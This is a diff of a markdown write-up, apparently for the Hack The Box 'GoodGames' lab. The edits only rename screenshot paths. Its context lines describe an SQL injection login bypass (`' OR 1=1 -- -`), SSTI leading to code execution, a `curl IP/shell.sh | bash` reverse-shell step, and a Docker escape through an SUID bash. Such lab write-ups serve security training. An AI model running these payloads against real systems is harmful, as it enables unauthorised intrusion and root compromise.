@@ -18,7 +18,7 @@ Take note of the `goodgames.htb` domain name.&#x20;
 
 The website is about some video games stuff:
 
-<figure><img src="../../../.gitbook/assets/image (23).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (23) (2).png" alt=""><figcaption></figcaption></figure>
 
 In the corner of the page, there's a login available.
 
@@ -26,7 +26,7 @@ In the corner of the page, there's a login available.
 
 This login is bypassable with the `' OR 1=1 -- -` input for the `email` parameter. When we login, we would be redirected to `internal-administration.goodgames.htb`.  This page has another login where SQL Injection does not work.
 
-<figure><img src="../../../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (1) (1) (7).png" alt=""><figcaption></figcaption></figure>
 
 Initially, I assumed that we needed to find credentials elsewhere and looked around the website. Understanding that there was an SQL Injection weakness earlier, we probably could dump out the credentials.
 
@@ -58,7 +58,7 @@ The SSTI also granted us RCE on the server with this payload:
 
 With this, we can replace the `id` command with a `curl IP/shell.sh | bash` payload to gain a reverse shell as root on this Docker Container.
 
-<figure><img src="../../../.gitbook/assets/image (22).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (22) (5).png" alt=""><figcaption></figcaption></figure>
 
 ## Docker Escape
 
@@ -86,7 +86,7 @@ When copying files into that directory, because I was a root user in the contain
 
 This created a bash file with the SUID bit set within the host:
 
-<figure><img src="../../../.gitbook/assets/image (31).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (31) (1).png" alt=""><figcaption></figcaption></figure>
 
 Getting root is trivial:
 
